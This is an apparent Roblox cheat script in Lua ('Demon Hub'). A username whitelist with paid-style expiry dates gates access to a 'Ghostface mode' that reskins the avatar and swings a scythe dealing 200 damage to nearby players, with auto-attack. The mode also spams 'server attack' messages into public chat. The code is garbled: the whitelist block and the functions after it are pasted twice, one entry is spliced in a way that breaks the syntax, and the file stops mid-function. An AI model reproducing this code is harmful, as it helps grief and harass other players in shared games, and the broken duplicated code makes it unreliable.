-- Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- ===== SISTEMA DE WHITELIST COM EXPIRAÇÃO =====
local function getCurrentTimestamp()
    return os.time()
end

local function parseDateTime(dateString)
    local day, month, year, hour, minute = dateString:match("(%d+)/(%d+)/(%d+) (%d+):(%d+)")
    if day and month and year and hour and minute then
        return os.time({
            day = tonumber(day),
            month = tonumber(month),
            year = tonumber(year),
            hour = tonumber(hour),
            min = tonumber(minute),
            sec = 0
        })
    end
    return nil
end

-- Formatar data para exibição
local function formatDate(timestamp)
    if not timestamp then return "PERMANENTE" end
    return os.date("%d/%m/%Y %H:%M", timestamp)
end

-- Sistema de Whitelist com expiração
local WhitelistData = {
    ["hiro909088"] = {type = "Dono", expires = nil}, -- Permanente
    ["drakeee777"] = {type = "Staff", expires = nil}, -- Permanente
    ["grabriel_9990"] = {type = "Staff", expires = nil}, -- Permanente
    ["rmss_2012"] = {type = "Staff", expires = nil}, -- Permanente
    ["gamer_dirvedidap"] = {type = "Staff", expires = nil}, -- Permanente
    ["slingshotmate8h"] = {type = "Staff", expires = nil}, -- Permanente
    ["torajuiorsudud7"] = {type = "Staff", expires = nil}, -- Permanente
    ["thebest09520"] = {type = "Dono", expires = nil}, -- Permanente
    ["miuuq_333"] = {type = "Usuário ADM", expires = nil}, -- Permanente
    ["eusouumbacome"] = {type = "Usuário ADM", expires = nil}, -- Permanente
    ["ryehd52835"] = {type = "Usuário ADM", expires = parseDateTime("15/01/2026 23:59")},
    ["pelotocino_x80"] = {type = "Usuário ADM", expires = parseDateTime("14/11/2025 23:59")},
    ["camirurge"] = {type = "Usuário ADM", expires = parseDateTime("06/12/2025 14:00")},
    ["shinidert10"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["caiozn7_669"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["donarzissus"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["vampzinkkj_1"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["ppyszt"] = {type = "Usuário ADM", expires = parseDateTime("7/01/2026 18:30")},
    ["pedro_roneido"] = {type = "Usuário ADM", expires = parseDateTime("10/01/2030 12:00")},
    ["pedro_roneido20"] = {type = "Usuário ADM", expires = parseDateTime("10/01/2030 12:00")},
    ["ixi362"] = {type = "Usuário ADM", expires = parseDateTime("05/01/2030 15:45")},
    ["jifhgiu"] = {type = "Usuário ADM", expires = parseDateTime("25/12/2030 20:00")},
    ["piloto158d"] = {type = "Usuário ADM", expires = parseDateTime("30/12/2030 14:20")},
    ["rafaelgms7810396"] = {type = "Usuário ADM", expires = parseDateTime("25/12/2030 20:00")},
    ["ilu1_22"] = {type = "Usuário ADM", expires = parseDateTime("08/01/2030 10:30")},
    ["xmarcelo_27262"] = {type = "Usuário ADM", expires = parseDateTime("12/01/2030 16:15")},
    ["ryansididd"] = {type = "Usuário ADM", expires = parseDateTime("03/01/2030 09:00")},
    ["redz_hub99975"] = {type = "Usuário ADM", expires = parseDateTime("28/12/2030 22:45")},
    ["teteu0902201mc"] = {type = "Usuário ADM", expires = parseDateTime("15/01/2030 11:30")},
    ["amongus23445844sad"] = {type = "Usuário ADM", expires = parseDateTime("18/12/2030 19:20")},
    ["ttyyryjuh"] = {type = "Usuário ADM", expires = parseDateTime("22/12/2030 13:10")},
    ["kevin_oliverra10"] = {type = "Usuário ADM", expires = parseDateTime("07/01/2030 17:40")},
    ["eduard0k0"] = {type = "Usuário ADM", expires = parseDateTime("14/01/2030 08:50")},
    ["gh707080s"] = {type = "Usuário ADM", expires = parseDateTime("31/12/2030 23:59")},
    ["luroblox1262"] = {type = "Usuário ADM", expires = parseDateTime("06/01/2030 14:25")},
    ["bonasamigo"] = {type = "Usuário ADM", expires = parseDateTime("19/10/2030 14:30")},
    ["manopp72"] = {type = "Usuário ADM", expires = parseDateTime("25/10/2025 18:40")},
    ["zack_89901"] = {type = "Usuário ADM", expires = parseDateTime("25/10/2025 18:40")},
    ["rackffr9"] = {type = "Usuário ADM", expires = parseDateTime("20/11/2025 18:40")},
    ["oibuto7"] = {type = "Usuário ADM", expires = parseDateTime("31/10/2025 14:40")},
    ["ensisbsjbrhe"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["gui_neh1023"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["killert_494"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["teste"] = {type = "Usuário ADM", expires = nil},
}

-- Função para verificar se a whitelist está expirada
local function isWhitelistExpired(username)
    local userData = WhitelistData[username:lower()]
    if not userData then
        return true, "Não está na whitelist"
    end
    
    if userData.expires then
        local currentTime = getCurrentTimestamp()
        if currentTime > userData.expires then
            return true, "Whitelist expirada em " .. formatDate(userData.expires)
        end
        return false, "Válida até " .. formatDate(userData.expires)
    end
    
    return false, "PERMANENTE"
end

-- Função para obter tipo de usuário com verificação de expiração
local function getUserWhitelistType(username)
    local expired, message = isWhitelistExpired(username)
    if expired then
        return nil, message
    end
    
    local userData = WhitelistData[username:lower()]
    return userData.type, message
end

-- Função para verificar whitelist no início
local function verifyWhitelistOnStart()
    local username = LocalPlayer.Name:lower()
    local userType, statusMessage = getUserWhitelistType(username)
    
    if not userType then
        task.wait(2)
        local kickMessage = "❌ WHITELIST VERIFICATION FAILED!\n\n"
        kickMessage = kickMessage .. "Status: " .. statusMessage .. "\n\n"
        kickMessage = kickMessage .. "Entre em contato com o desenvolvedor para renovar sua whitelist."
        LocalPlayer:Kick(kickMessage)
        return false, statusMessage
    end
    
    print("[Demon Hub] Whitelist verificada com sucesso!")
    print("[Demon Hub] Usuário:", username)
    print("[Demon Hub] Tipo:", userType)
    print("[Demon Hub] Status:", statusMessage)
    
    return true, userType
end

-- Monitorar expiração em tempo real
local function monitorWhitelistExpiration()
    while true do
        task.wait(30) -- Verifica a cada 30 segundos
        
        local username = LocalPlayer.Name:lower()
        local expired, message = isWhitelistExpired(username)
        
        if expired then
            task.wait(2)
            LocalPlayer:Kick("❰ 🎃 ❱ WHITELIST EXPIROU!\n\nSua whitelist expirou.\nEntre em contato com o desenvolvedor.\n\nStatus: " .. message)
            return
        end
    end
end

-- Executar verificação inicial
local isWhitelisted, whitelistStatus = verifyWhitelistOnStart()
if not isWhitelisted then
    return
end

-- Iniciar monitoramento de expiração
task.spawn(monitorWhitelistExpiration)

-- Lista de donos autorizados (apenas para controle do painel admin)
local Donos = {
    ["hiro909088"] = true,
    ["pedriinn222"] = true,
    ["thebest09520"] = true,
    ["donarzissus"] = true, 
    ["rafaelgms7810396"] = true,
    ["grabriel_9990"] = true,
    ["slingshotmate8h"] = true,
    ["gamer_dirvedidap"] = true,
    ["rmss_2012"] = true,
}local WhitelistData = {
    ["hiro909088"] = {type = "Dono", expires = nil    ["teste"] = {type = "Usuário ADM", expires = nil},
}, -- Permanente
    ["drakeee777"] = {type = "Staff", expires = nil}, -- Permanente
    ["grabriel_9990"] = {type = "Staff", expires = nil}, -- Permanente
    ["rmss_2012"] = {type = "Staff", expires = nil}, -- Permanente
    ["gamer_dirvedidap"] = {type = "Staff", expires = nil}, -- Permanente
    ["slingshotmate8h"] = {type = "Staff", expires = nil}, -- Permanente
    ["torajuiorsudud7"] = {type = "Staff", expires = nil}, -- Permanente
    ["thebest09520"] = {type = "Dono", expires = nil}, -- Permanente
    ["miuuq_333"] = {type = "Usuário ADM", expires = nil}, -- Permanente
    ["eusouumbacome"] = {type = "Usuário ADM", expires = nil}, -- Permanente
    ["ryehd52835"] = {type = "Usuário ADM", expires = parseDateTime("15/01/2026 23:59")},
    ["pelotocino_x80"] = {type = "Usuário ADM", expires = parseDateTime("14/11/2025 23:59")},
    ["camirurge"] = {type = "Usuário ADM", expires = parseDateTime("06/12/2025 14:00")},
    ["shinidert10"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["caiozn7_669"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["donarzissus"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["vampzinkkj_1"] = {type = "Usuário ADM", expires = parseDateTime("15/12/2030 23:59")},
    ["ppyszt"] = {type = "Usuário ADM", expires = parseDateTime("7/01/2026 18:30")},
    ["pedro_roneido"] = {type = "Usuário ADM", expires = parseDateTime("10/01/2030 12:00")},
    ["pedro_roneido20"] = {type = "Usuário ADM", expires = parseDateTime("10/01/2030 12:00")},
    ["ixi362"] = {type = "Usuário ADM", expires = parseDateTime("05/01/2030 15:45")},
    ["jifhgiu"] = {type = "Usuário ADM", expires = parseDateTime("25/12/2030 20:00")},
    ["piloto158d"] = {type = "Usuário ADM", expires = parseDateTime("30/12/2030 14:20")},
    ["rafaelgms7810396"] = {type = "Usuário ADM", expires = parseDateTime("25/12/2030 20:00")},
    ["ilu1_22"] = {type = "Usuário ADM", expires = parseDateTime("08/01/2030 10:30")},
    ["xmarcelo_27262"] = {type = "Usuário ADM", expires = parseDateTime("12/01/2030 16:15")},
    ["ryansididd"] = {type = "Usuário ADM", expires = parseDateTime("03/01/2030 09:00")},
    ["redz_hub99975"] = {type = "Usuário ADM", expires = parseDateTime("28/12/2030 22:45")},
    ["teteu0902201mc"] = {type = "Usuário ADM", expires = parseDateTime("15/01/2030 11:30")},
    ["amongus23445844sad"] = {type = "Usuário ADM", expires = parseDateTime("18/12/2030 19:20")},
    ["ttyyryjuh"] = {type = "Usuário ADM", expires = parseDateTime("22/12/2030 13:10")},
    ["kevin_oliverra10"] = {type = "Usuário ADM", expires = parseDateTime("07/01/2030 17:40")},
    ["eduard0k0"] = {type = "Usuário ADM", expires = parseDateTime("14/01/2030 08:50")},
    ["gh707080s"] = {type = "Usuário ADM", expires = parseDateTime("31/12/2030 23:59")},
    ["luroblox1262"] = {type = "Usuário ADM", expires = parseDateTime("06/01/2030 14:25")},
    ["bonasamigo"] = {type = "Usuário ADM", expires = parseDateTime("19/10/2030 14:30")},
    ["manopp72"] = {type = "Usuário ADM", expires = parseDateTime("25/10/2025 18:40")},
    ["zack_89901"] = {type = "Usuário ADM", expires = parseDateTime("25/10/2025 18:40")},
    ["rackffr9"] = {type = "Usuário ADM", expires = parseDateTime("20/11/2025 18:40")},
    ["oibuto7"] = {type = "Usuário ADM", expires = parseDateTime("31/10/2025 14:40")},
    ["ensisbsjbrhe"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["gui_neh1023"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["killert_494"] = {type = "Usuário ADM", expires = parseDateTime("09/10/2030 19:40")},
    ["teste"] = {type = "Usuário ADM", expires = nil},
}

-- Função para verificar se a whitelist está expirada
local function isWhitelistExpired(username)
    local userData = WhitelistData[username:lower()]
    if not userData then
        return true, "Não está na whitelist"
    end
    
    if userData.expires then
        local currentTime = getCurrentTimestamp()
        if currentTime > userData.expires then
            return true, "Whitelist expirada em " .. formatDate(userData.expires)
        end
        return false, "Válida até " .. formatDate(userData.expires)
    end
    
    return false, "PERMANENTE"
end

-- Função para obter tipo de usuário com verificação de expiração
local function getUserWhitelistType(username)
    local expired, message = isWhitelistExpired(username)
    if expired then
        return nil, message
    end
    
    local userData = WhitelistData[username:lower()]
    return userData.type, message
end

-- Função para verificar whitelist no início
local function verifyWhitelistOnStart()
    local username = LocalPlayer.Name:lower()
    local userType, statusMessage = getUserWhitelistType(username)
    
    if not userType then
        task.wait(2)
        local kickMessage = "❌ WHITELIST VERIFICATION FAILED!\n\n"
        kickMessage = kickMessage .. "Status: " .. statusMessage .. "\n\n"
        kickMessage = kickMessage .. "Entre em contato com o desenvolvedor para renovar sua whitelist."
        LocalPlayer:Kick(kickMessage)
        return false, statusMessage
    end
    
    print("[Demon Hub] Whitelist verificada com sucesso!")
    print("[Demon Hub] Usuário:", username)
    print("[Demon Hub] Tipo:", userType)
    print("[Demon Hub] Status:", statusMessage)
    
    return true, userType
end

-- Monitorar expiração em tempo real
local function monitorWhitelistExpiration()
    while true do
        task.wait(30) -- Verifica a cada 30 segundos
        
        local username = LocalPlayer.Name:lower()
        local expired, message = isWhitelistExpired(username)
        
        if expired then
            task.wait(2)
            LocalPlayer:Kick("❰ 🎃 ❱ WHITELIST EXPIROU!\n\nSua whitelist expirou.\nEntre em contato com o desenvolvedor.\n\nStatus: " .. message)
            return
        end
    end
end

-- Executar verificação inicial
local isWhitelisted, whitelistStatus = verifyWhitelistOnStart()
if not isWhitelisted then
    return
end

-- Iniciar monitoramento de expiração
task.spawn(monitorWhitelistExpiration)

-- Lista de donos autorizados (apenas para controle do painel admin)
local Donos = {
    ["hiro909088"] = true,
    ["pedriinn222"] = true,
    ["thebest09520"] = true,
    ["donarzissus"] = true, 
    ["rafaelgms7810396"] = true,
    ["grabriel_9990"] = true,
    ["slingshotmate8h"] = true,
    ["gamer_dirvedidap"] = true,
    ["rmss_2012"] = true,
}

-- ===== SISTEMA DE TAGS PARA TODOS OS USUÁRIOS DA WHITELIST =====
local function createSpecialTag(player, tagText)
    local char = player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- remove tag antiga
    local old = head:FindFirstChild("SpecialTag")
    if old then old:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SpecialTag"
    billboardGui.Size = UDim2.new(0, 300, 0, 70)
    billboardGui.StudsOffset = Vector3.new(0, 3.5, 0)
    billboardGui.Adornee = head
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = head

    -- Usar DisplayName em vez do nome do usuário
    local displayName = player.DisplayName
    local userName = player.Name
    
    -- Tag com DisplayName e tipo juntos em VERMELHO
    local tagLabel = Instance.new("TextLabel")
    tagLabel.Size = UDim2.new(1, 0, 1, 0)
    tagLabel.BackgroundTransparency = 1
    tagLabel.Text = displayName .. "\n" .. tagText
    tagLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- VERMELHO COMPLETO
    tagLabel.TextScaled = true
    tagLabel.Font = Enum.Font.GothamBold
    tagLabel.TextStrokeTransparency = 0.2
    tagLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    tagLabel.Parent = billboardGui
end

-- Função para aplicar tag automaticamente para TODOS os usuários na whitelist
local function applyTag(player)
    local userType, statusMessage = getUserWhitelistType(player.Name:lower())
    if userType then
        print("[Demon Hub] Aplicando tag para:", player.Name, "DisplayName:", player.DisplayName, "Tipo:", userType)
        
        local function apply()
            if player.Character then
                createSpecialTag(player, userType)
                print("[Demon Hub] Tag aplicada com sucesso para:", player.DisplayName)
            end
        end
        
        player.CharacterAdded:Connect(function()
            task.wait(1)
            apply()
        end)
        
        -- Aplica imediatamente se já tiver character
        if player.Character then
            task.spawn(function()
                task.wait(1)
                apply()
            end)
        end
    else
        print("[Demon Hub] Usuário não está na whitelist:", player.Name)
    end
end

-- Aplica tags em todos os jogadores que estão na whitelist
for _, p in ipairs(Players:GetPlayers()) do
    task.spawn(function()
        task.wait(2) -- Espera um pouco para garantir que tudo carregou
        applyTag(p)
    end)
end

-- Aplica para quem entrar depois
Players.PlayerAdded:Connect(function(p)
    task.spawn(function()
        task.wait(2) -- Espera um pouco para garantir que tudo carregou
        applyTag(p)
    end)
end)

-- ===== SISTEMA GHOSTFACE COMPLETO =====
local ghostfaceEquipped = false
local foiceModel = nil
local foiceDamage = 200
local swingCooldown = false
local canAttack = false
local ghostfaceConnections = {}

-- IDs dos assets do Ghostface
local GHOSTFACE_ASSETS = {
    Roupa = 11754242952,
    Cabeça = 129715988065000,
    Calça = 14368428184,
    Acessório = 11452821,
    HotbarIcon = "rbxassetid://123228687140391",
}

-- Animações do Ghostface
local GHOSTFACE_ANIMATIONS = {
    Walk = "rbxassetid://121350640829746",
    Run = "rbxassetid://121350640829746",
    Idle1 = "rbxassetid://135425213693488",
    Idle2 = "rbxassetid://135579638960045",
    Jump = "rbxassetid://104108770420406",
    Fall = "rbxassetid://104108770420406",
    Climb = "rbxassetid://421121499",
    Attack = "rbxassetid://191628653",
}

-- Serviços necessários
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

-- Função para enviar mensagens
local function SendMessage(text, color)
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Ghostface] " .. text,
        Color = color or Color3.fromRGB(100, 255, 100),
        Font = Enum.Font.GothamBold
    })
end

-- Função para atualizar a Hotbar
local function UpdateHotbar()
    -- Simular mudança na hotbar
    SendMessage("Hotbar atualizada com ícone do Ghostface! 👻", Color3.fromRGB(150, 50, 255))
    
    -- Efeito visual na tela
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "GhostfaceHotbarEffect"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 0.1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.8
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 100, 0, 100)
    icon.Position = UDim2.new(0.5, -50, 0, 0)
    icon.BackgroundTransparency = 1
    icon.Image = "rbxassetid://123228687140391"
    icon.Parent = frame
    
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 0.5, 0)
    text.Position = UDim2.new(0, 0, 0.5, 0)
    text.BackgroundTransparency = 1
    text.Text = "GHOSTFACE MODE ACTIVATED"
    text.TextColor3 = Color3.fromRGB(150, 50, 255)
    text.Font = Enum.Font.GothamBold
    text.TextSize = 20
    text.Parent = frame
    
    -- Remover após 3 segundos
    task.delay(3, function()
        screenGui:Destroy()
    end)
end

-- Função para aplicar avatar Ghostface
local function ApplyGhostfaceAvatar()
    if ghostfaceEquipped then return end
    
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local Humanoid = Character:WaitForChild("Humanoid")
    
    -- Remover roupas existentes
    for _, item in ipairs(Character:GetChildren()) do
        if item:IsA("Clothing") or item:IsA("Accessory") then
            item:Destroy()
        end
    end
    
    -- Aplicar textura Ghostface no personagem
    for _, part in ipairs(Character:GetChildren()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            -- Criar decal/textura do Ghostface
            local decal = Instance.new("Decal")
            decal.Name = "GhostfaceTexture"
            decal.Texture = "rbxassetid://11754242952"
            decal.Face = Enum.NormalId.Front
            decal.Parent = part
            
            -- Ajustar cor para preto
            part.BrickColor = BrickColor.new("Really black")
            part.Material = Enum.Material.SmoothPlastic
            
            if part.Name == "Head" then
                -- Máscara do Ghostface
                local specialMesh = Instance.new("SpecialMesh")
                specialMesh.MeshId = "rbxassetid://129715988065000"
                specialMesh.TextureId = "rbxassetid://11754242952"
                specialMesh.Scale = Vector3.new(1.1, 1.1, 1.1)
                specialMesh.Parent = part
                
                -- Olhos brilhantes
                local pointLight = Instance.new("PointLight")
                pointLight.Color = Color3.fromRGB(255, 0, 0)
                pointLight.Brightness = 5
                pointLight.Range = 10
                pointLight.Parent = part
            end
        end
    end
    
    -- Aplicar animações
    local function setupAnimations()
        -- Carregar animações
        local walkAnim = Instance.new("Animation")
        walkAnim.AnimationId = GHOSTFACE_ANIMATIONS.Walk
        
        local idleAnim = Instance.new("Animation")
        idleAnim.AnimationId = GHOSTFACE_ANIMATIONS.Idle1
        
        local runAnim = Instance.new("Animation")
        runAnim.AnimationId = GHOSTFACE_ANIMATIONS.Run
        
        local attackAnim = Instance.new("Animation")
        attackAnim.AnimationId = GHOSTFACE_ANIMATIONS.Attack
        
        -- Criar tracks
        local walkTrack = Humanoid:LoadAnimation(walkAnim)
        local idleTrack = Humanoid:LoadAnimation(idleAnim)
        local runTrack = Humanoid:LoadAnimation(runAnim)
        local attackTrack = Humanoid:LoadAnimation(attackAnim)
        
        -- Sistema de animações
        ghostfaceConnections["movement"] = Humanoid.Running:Connect(function(speed)
            if not canAttack then return end
            
            if speed > 0 then
                idleTrack:Stop()
                if speed > 16 then
                    walkTrack:Stop()
                    if not runTrack.IsPlaying then
                        runTrack:Play()
                    end
                else
                    runTrack:Stop()
                    if not walkTrack.IsPlaying then
                        walkTrack:Play()
                    end
                end
            else
                walkTrack:Stop()
                runTrack:Stop()
                if not idleTrack.IsPlaying then
                    idleTrack:Play()
                end
            end
        end)
        
        idleTrack:Play()
        
        -- Armazenar tracks
        ghostfaceConnections["walkTrack"] = walkTrack
        ghostfaceConnections["idleTrack"] = idleTrack
        ghostfaceConnections["runTrack"] = runTrack
        ghostfaceConnections["attackTrack"] = attackTrack
    end
    
    setupAnimations()
    return true
end

-- Função para criar a foice do Ghostface
local function CreateGhostfaceScythe()
    if foiceModel then 
        foiceModel:Destroy()
        foiceModel = nil
    end
    
    foiceModel = Instance.new("Model")
    foiceModel.Name = "GhostfaceScythe"
    
    -- Haste da foice
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(0.4, 6, 0.4)
    handle.Material = Enum.Material.Neon
    handle.BrickColor = BrickColor.new("Really black")
    handle.CanCollide = false
    handle.Transparency = 0
    handle.Parent = foiceModel
    
    -- Lâmina principal
    local blade = Instance.new("Part")
    blade.Name = "Blade"
    blade.Size = Vector3.new(0.2, 4, 3)
    blade.Shape = Enum.PartType.Wedge
    blade.Material = Enum.Material.Neon
    blade.BrickColor = BrickColor.new("Lavender")
    blade.Transparency = 0.3
    blade.CanCollide = false
    blade.Parent = foiceModel
    
    -- Efeito brilhante
    local glow = Instance.new("SurfaceGui", blade)
    glow.Face = Enum.NormalId.Front
    glow.CanvasSize = Vector2.new(100, 100)
    
    local glowFrame = Instance.new("Frame", glow)
    glowFrame.Size = UDim2.new(1, 0, 1, 0)
    glowFrame.BackgroundColor3 = Color3.fromRGB(150, 50, 255)
    glowFrame.BackgroundTransparency = 0.5
    glowFrame.BorderSizePixel = 0
    
    -- Welding
    local weld = Instance.new("Weld")
    weld.Part0 = handle
    weld.Part1 = blade
    weld.C0 = CFrame.new(0, -3, 0) * CFrame.Angles(math.rad(-45), 0, 0)
    weld.Parent = handle
    
    -- Efeito de partículas
    local particles = Instance.new("ParticleEmitter")
    particles.Texture = "rbxassetid://242863722"
    particles.Color = ColorSequence.new(Color3.fromRGB(150, 50, 255))
    particles.Size = NumberSequence.new(0.3, 0.1)
    particles.Transparency = NumberSequence.new(0.3, 0.8)
    particles.Lifetime = NumberRange.new(0.5, 1)
    particles.Rate = 50
    particles.Speed = NumberRange.new(2)
    particles.VelocityInheritance = 0.5
    particles.Parent = blade
    
    -- Trail
    local trail = Instance.new("Trail")
    trail.Attachment0 = Instance.new("Attachment", handle)
    trail.Attachment0.Position = Vector3.new(0, 3, 0)
    trail.Attachment1 = Instance.new("Attachment", blade)
    trail.Attachment1.Position = Vector3.new(0, -2, 1.5)
    trail.Color = ColorSequence.new(Color3.fromRGB(150, 50, 255))
    trail.Lifetime = 0.3
    trail.Transparency = NumberSequence.new(0.3, 0.8)
    trail.Parent = foiceModel
    
    -- Som
    local swingSound = Instance.new("Sound")
    swingSound.SoundId = "rbxassetid://911846813"
    swingSound.Volume = 1
    swingSound.Parent = handle
    
    foiceModel.PrimaryPart = handle
    return foiceModel
end

-- Função para equipar e usar a foice
local function EquipAndUseScythe()
    local Character = LocalPlayer.Character
    if not Character then return false end
    
    local RightArm = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm")
    if not RightArm then return false end
    
    -- Criar foice
    local scythe = CreateGhostfaceScythe()
    scythe.Parent = Workspace
    
    -- Welding
    local weld = Instance.new("Weld")
    weld.Part0 = RightArm
    weld.Part1 = scythe.PrimaryPart
    weld.C0 = CFrame.new(0, -1, 0) * CFrame.Angles(math.rad(-90), 0, math.rad(90))
    weld.Parent = scythe.PrimaryPart
    
    -- Sistema de ataque
    local function performAttack()
        if swingCooldown or not canAttack then return end
        swingCooldown = true
        
        -- Som
        local sound = scythe.PrimaryPart:FindFirstChild("Sound")
        if sound then 
            sound:Play() 
        end
        
        -- Animação de ataque
        local attackTrack = ghostfaceConnections["attackTrack"]
        if attackTrack then
            attackTrack:Play()
        end
        
        -- Efeito de swing
        local startCFrame = weld.C0
        local endCFrame = startCFrame * CFrame.Angles(math.rad(-60), 0, 0)
        
        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        local tween = TweenService:Create(weld, tweenInfo, {C0 = endCFrame})
        tween:Play()
        
        -- Enviar mensagem de ataque
        task.spawn(function()
            local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
            if chatChannel then
                chatChannel:SendAsync("SERVER ATACK BY GHOSTFACE 👻")
            end
        end)
        
        -- Sistema de hit
        task.delay(0.1, function()
            local hitbox = Instance.new("Part")
            hitbox.Size = Vector3.new(8, 8, 8)
            hitbox.Transparency = 1
            hitbox.CanCollide = false
            hitbox.Anchored = false
            hitbox.Parent = Workspace
            hitbox.CFrame = scythe.PrimaryPart.CFrame * CFrame.new(0, 0, -4)
            
            -- Detectar players
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local targetChar = player.Character
                    local humanoid = targetChar:FindFirstChildOfClass("Humanoid")
                    local rootPart = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso")
                    
                    if humanoid and rootPart and (rootPart.Position - hitbox.Position).Magnitude < 5 then
                        -- Dano
                        humanoid:TakeDamage(foiceDamage)
                        
                        -- Efeito visual
                        local highlight = Instance.new("Highlight")
                        highlight.FillColor = Color3.fromRGB(255, 0, 0)
                        highlight.OutlineColor = Color3.fromRGB(255, 50, 50)
                        highlight.FillTransparency = 0.7
                        highlight.OutlineTransparency = 0
                        highlight.Parent = targetChar
                        
                        game.Debris:AddItem(highlight, 1)
                    end
                end
            end
            
            game.Debris:AddItem(hitbox, 0.2)
        end)
        
        -- Reset
        task.wait(0.3)
        tween = TweenService:Create(weld, TweenInfo.new(0.1), {C0 = startCFrame})
        tween:Play()
        
        task.wait(0.2)
        swingCooldown = false
    end
    
    -- Conexão de ataque automático
    local autoAttack = false
    ghostfaceConnections["attackInput"] = UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and canAttack then
            performAttack()
        elseif input.KeyCode == Enum.KeyCode.E and canAttack then
            autoAttack = not autoAttack
            SendMessage("Ataque automático: " .. (autoAttack and "ATIVADO" or "DESATIVADO"))
        end
    end)
    
    -- Ataque automático
    ghostfaceConnections["autoAttack"] = RunService.Heartbeat:Connect(function()
        if autoAttack and canAttack and not swingCooldown then
            performAttack()
            task.wait(0.5) -- Delay entre ataques automáticos
        end
    end)
    
    -- Permitir ataque
    canAttack = true
    SendMessage("Foice equipada! Clique esquerdo para atacar | E para auto-ataque")
    
    return true
end

-- Função principal que faz TUDO de uma vez
local function ActivateGhostfaceMode()
    if ghostfaceEquipped then
        SendMessage("Modo Ghostface já está ativo!", Color3.fromRGB(255, 255, 0))
        return
    end
    
    SendMessage("ATIVANDO MODO GHOSTFACE...", Color3.fromRGB(150, 50, 255))
    
    -- Passo 1: Atualizar Hotbar
    UpdateHotbar()
    task.wait(0.5)
    
    -- Passo 2: Aplicar Avatar
    ApplyGhostfaceAvatar()
    task.wait(1)
    
    -- Passo 3: Equipar e ativar foice
    EquipAndUseScythe()
    task.wait(0.5)
    
    -- Passo 4: Mensagem final
    ghostfaceEquipped = true
    canAttack = true
    
    SendMessage("MODO GHOSTFACE ATIVADO COMPLETAMENTE! 👻", Color3.fromRGB(150, 50, 255))
    
    -- Enviar mensagem no chat
    task.spawn(function()
        local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if chatChannel then
            chatChannel:SendAsync("👻 GHOSTFACE INVADIU O SERVER! 👻")
            task.wait(2)
            chatChannel:SendAsync("SERVER ATACK BY GHOSTFACE 👻")
        end
    end)
    
    return true
end

-- Função para desativar TUDO
local function DeactivateGhostfaceMode()
    if not ghostfaceEquipped then
        SendMessage("Modo Ghostface não está ativo!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    ghostfaceEquipped = false
    canAttack = false
    
    -- Remover foice
    if foiceModel then
        foiceModel:Destroy()
        foiceModel = nil
    end
    
    -- Desconectar conexões
    for name, connection in pairs(ghostfaceConnections) do
        if typeof(connection) == "RBXScriptConnection" then
            connection:Disconnect()
        elseif typeof(connection) == "AnimationTrack" then
            connection:Stop()
        end
    end
    ghostfaceConnections = {}
    
    -- Resetar personagem
    local Character = LocalPlayer.Character
    if Character then
        -- Remover efeitos
        for _, item in ipairs(Character:GetDescendants()) do
            if item:IsA("Decal") and item.Name == "GhostfaceTexture" then
                item:Destroy()
            elseif item:IsA("SpecialMesh") then
                item:Destroy()
            elseif item:IsA("PointLight") then
                item:Destroy()
            elseif item:IsA("Highlight") then
                item:Destroy()
            end
        end
        
        -- Resetar cores
        for _, part in ipairs(Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.BrickColor = BrickColor.new("Medium stone grey")
                part.Material = Enum.Material.Plastic
            end
        end
    end
    
    -- Remover GUI
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        local ghostfaceGUI = playerGui:FindFirstChild("GhostfaceHotbarEffect")
